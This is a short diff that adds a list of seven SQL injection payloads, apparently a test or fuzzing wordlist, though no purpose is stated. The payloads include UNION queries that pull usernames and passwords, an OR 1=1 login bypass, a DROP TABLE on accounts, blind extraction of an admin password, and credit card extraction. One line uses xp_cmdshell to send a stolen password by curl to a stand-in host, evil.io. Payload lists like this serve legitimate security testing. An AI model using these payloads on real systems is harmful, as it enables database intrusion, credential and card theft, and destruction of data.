@@ -1,0 +1,7 @@
+' UNION SELECT username, password FROM users --
+' OR 1=1--
+'; EXEC xp_cmdshell('curl https://evil.io/?x='+(SELECT TOP 1 password FROM users)); --
+"; SELECT * FROM information_schema.tables WHERE 'a'='a
+1; DROP TABLE accounts; --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND substring(password,1,1)='a')--
+" OR JSON_EXTRACT(credit_card, '$.number') IS NOT NULL OR "1"="1
